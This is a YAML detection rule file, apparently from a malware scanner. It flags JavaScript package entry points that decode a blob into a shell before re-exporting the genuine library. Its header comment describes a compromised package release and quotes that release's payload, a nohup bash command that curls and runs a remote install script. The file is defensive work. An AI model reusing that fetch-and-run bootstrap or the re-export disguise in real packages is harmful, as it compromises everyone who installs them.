# A package entry point that runs a shell bootstrap before handing control to
# the real library. The published dist/index.js keeps its original
# `module.exports = require('./sdk...')` tail, so the module behaves exactly as
# advertised; the only addition is one exec() above it that decodes a blob and
# pipes it to a shell. @velora/dex-sdk 9.4.1 shipped precisely this: an
# encoded `nohup bash -c "$(curl http://<ip>/install.sh)"`.
#
# The existing import-time stagers all require the long form (fetch, write,
# chmod, detached spawn); a one-line shell bootstrap satisfies none of them,
# which is why this states the short form on its own terms.
defaults:
  platforms: [unix, macos]
  for: [javascript, typescript]
  attack: T1195.002,T1059.007
  mbc: B0024

composite_rules:
  - id: entrypoint-shell-bootstrap-before-reexport
    desc: Entry point shell-bootstraps then re-exports
    crit: hostile
    conf: 0.96
    near_lines: 40
    all:
      - id: micro-behaviors/process/create/shell/bridge::js-exec-decode-pipe-shell-command
      - id: micro-behaviors/data/control-flow/module-exec::commonjs-module-reexport
    unless:
      - id: metadata/package/testing/
  # Same bootstrap without the re-export tail: still a package file whose
  # module scope decodes a blob into a shell.
  - id: module-scope-decoded-shell-bootstrap
    desc: Module scope decodes a blob into a shell
    crit: suspicious
    conf: 0.93
    all:
      - id: micro-behaviors/process/create/shell/bridge::js-exec-decode-pipe-shell-command
      - id: micro-behaviors/process/create/shell/bridge::child-process-destructure-require
    unless:
      - id: metadata/package/testing/
